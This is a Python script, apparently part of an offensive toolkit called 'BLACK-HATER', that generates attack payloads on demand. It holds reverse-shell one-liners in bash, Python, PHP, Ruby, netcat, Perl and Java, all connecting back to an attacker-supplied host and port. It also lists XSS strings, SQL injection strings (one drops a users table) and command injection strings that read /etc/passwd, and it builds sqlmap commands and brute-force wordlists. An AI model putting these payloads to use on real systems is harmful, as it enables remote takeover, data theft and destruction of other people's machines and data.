#!/usr/bin/env python3
"""
Payload Generator - Generate exploit payloads for various platforms.
Part of BLACK-HATER cybersecurity skill.

Usage:
    python3 payload_generator.py --type reverse_shell --lhost 10.0.0.1 --lport 4444
    python3 payload_generator.py --type xss --output payloads.txt
    python3 payload_generator.py --type sqlmap --url "http://target.com/?id=1"
"""

import os
import sys
import argparse
import json
from pathlib import Path
from typing import Dict, List


class PayloadGenerator:
    """Generate exploit payloads for various attack vectors."""
    
    REVERSE_SHELLS = {
        'bash': '''
bash -i >& /dev/tcp/{lhost}/{lport} 0>&1
''',
        'python': '''
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
''',
        'python3': '''
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.run(["/bin/sh","-i"])'
''',
        'php': '''
php -r '$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");'
''',
        'ruby': '''
ruby -rsocket -e'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
''',
        'nc': '''
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f
''',
        'perl': '''
perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i")}};'
''',
        'java': '''
Runtime r = Runtime.getRuntime();
Process p = r.exec(new String[]{"/bin/bash", "-c", "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"});
p.waitFor();
''',
    }
    
    XSS_PAYLOADS = [
        '<script>alert(document.domain)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '"><script>alert(1)</script>',
        "';alert(1)//",
        '<body onload=alert(1)>',
        '<iframe src="javascript:alert(1)">',
        '<input onfocus=alert(1) autofocus>',
        '<details open ontoggle=alert(1)>',
        '<marquee onstart=alert(1)>',
    ]
    
    SQL_INJECTION_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "admin'--",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "1; DROP TABLE users--",
        "' AND 1=CONVERT(int,(SELECT @@version))--",
        "1' AND '1'='1",
        "1' AND '1'='2",
    ]
    
    COMMAND_INJECTION_PAYLOADS = [
        "; whoami",
        "| whoami",
        "`whoami`",
        "$(whoami)",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "; id",
        "| id",
        "'; whoami #",
        '" && whoami && echo "',
    ]
    
    def __init__(self):
        self.payloads = {}
    
    def generate_reverse_shell(self, lhost: str, lport: int) -> Dict[str, str]:
        """Generate reverse shell payloads."""
        print(f"\n[*] Generating reverse shell payloads")
        print(f"[*] LHOST: {lhost}")
        print(f"[*] LPORT: {lport}\n")
        
        shells = {}
        for name, template in self.REVERSE_SHELLS.items():
            payload = template.format(lhost=lhost, lport=lport).strip()
            shells[name] = payload
            print(f"## {name.upper()}")
            print(payload)
            print()
        
        self.payloads['reverse_shell'] = shells
        return shells
    
    def generate_xss(self) -> List[str]:
        """Generate XSS payloads."""
        print("\n[*] Generating XSS payloads\n")
        
        for i, payload in enumerate(self.XSS_PAYLOADS, 1):
            print(f"{i}. {payload}")
        
        self.payloads['xss'] = self.XSS_PAYLOADS
        return self.XSS_PAYLOADS
    
    def generate_sqlmap(self, url: str) -> str:
        """Generate sqlmap command."""
        print(f"\n[*] Generating sqlmap command\n")
        
        cmd = f'sqlmap -u "{url}" --batch --dbs --tables'
        print(cmd)
        
        self.payloads['sqlmap'] = cmd
        return cmd
    
    def generate_command_injection(self) -> List[str]:
        """Generate command injection payloads."""
        print("\n[*] Generating command injection payloads\n")
        
        for i, payload in enumerate(self.COMMAND_INJECTION_PAYLOADS, 1):
            print(f"{i}. {payload}")
        
        self.payloads['command_injection'] = self.COMMAND_INJECTION_PAYLOADS
        return self.COMMAND_INJECTION_PAYLOADS
    
    def generate_wordlist(self, pattern: str, max_length: int = 8) -> List[str]:
        """Generate custom wordlist based on pattern."""
        import itertools
        import string
        
        print(f"\n[*] Generating wordlist for pattern: {pattern}")
        
        words = set()
        
        # Replace ? with characters
        for length in range(1, max_length + 1):
            for combo in itertools.product(string.ascii_lowercase + string.digits, repeat=length):
                word = pattern
                for char in combo:
                    word = word.replace('?', char, 1)
                    if '?' not in word:
                        break
                if '?' not in word:
                    words.add(word)
        
        words = sorted(list(words))
        print(f"[*] Generated {len(words)} words\n")
        
        # Print sample
        for word in words[:20]:
            print(word)
        if len(words) > 20:
            print(f"... and {len(words) - 20} more")
        
        self.payloads['wordlist'] = words
        return words
    
    def save_payloads(self, output_dir: str = "."):
        """Save all generated payloads to files."""
        output_path = Path(output_dir)
        output_path.mkdir(parents=True, exist_ok=True)
        
        # Save reverse shells
        if 'reverse_shell' in self.payloads:
            for name, payload in self.payloads['reverse_shell'].items():
                file_path = output_path / f"shell_{name}.txt"
                with open(file_path, 'w') as f:
                    f.write(payload)
                print(f"[OK] Saved: {file_path}")
        
        # Save XSS payloads
        if 'xss' in self.payloads:
            file_path = output_path / "xss_payloads.txt"
            with open(file_path, 'w') as f:
                f.write('\n'.join(self.payloads['xss']))
            print(f"[OK] Saved: {file_path}")
        
        # Save wordlist
        if 'wordlist' in self.payloads:
            file_path = output_path / "wordlist.txt"
            with open(file_path, 'w') as f:
                f.write('\n'.join(self.payloads['wordlist']))
            print(f"[OK] Saved: {file_path}")
        
        # Save JSON summary
        summary_path = output_path / "payloads.json"
        with open(summary_path, 'w') as f:
            json.dump(self.payloads, f, indent=2, default=str)
        print(f"[OK] Saved: {summary_path}")


def main():
    parser = argparse.ArgumentParser(description='BLACK-HATER Payload Generator')
    parser.add_argument('--type', choices=['reverse_shell', 'xss', 'sqlmap', 
                                           'command_injection', 'wordlist'],
                       help='Payload type')
    parser.add_argument('--lhost', help='Local host for reverse shell')
    parser.add_argument('--lport', type=int, help='Local port for reverse shell')
    parser.add_argument('--url', help='Target URL for sqlmap')
    parser.add_argument('--pattern', help='Pattern for wordlist (? = wildcard)')
    parser.add_argument('--output', default='./payloads', help='Output directory')
    
    args = parser.parse_args()
    
    if not args.type:
        parser.print_help()
        sys.exit(1)
    
    generator = PayloadGenerator()
    
    if args.type == 'reverse_shell':
        if not args.lhost or not args.lport:
            print("[ERROR] --lhost and --lport required for reverse shell")
            sys.exit(1)
        generator.generate_reverse_shell(args.lhost, args.lport)
    
    elif args.type == 'xss':
        generator.generate_xss()
    
    elif args.type == 'sqlmap':
        if not args.url:
            print("[ERROR] --url required for sqlmap")
            sys.exit(1)
        generator.generate_sqlmap(args.url)
    
    elif args.type == 'command_injection':
        generator.generate_command_injection()
    
    elif args.type == 'wordlist':
        if not args.pattern:
            print("[ERROR] --pattern required for wordlist")
            sys.exit(1)
        generator.generate_wordlist(args.pattern)
    
    # Save payloads
    generator.save_payloads(args.output)


if __name__ == '__main__':
    main()
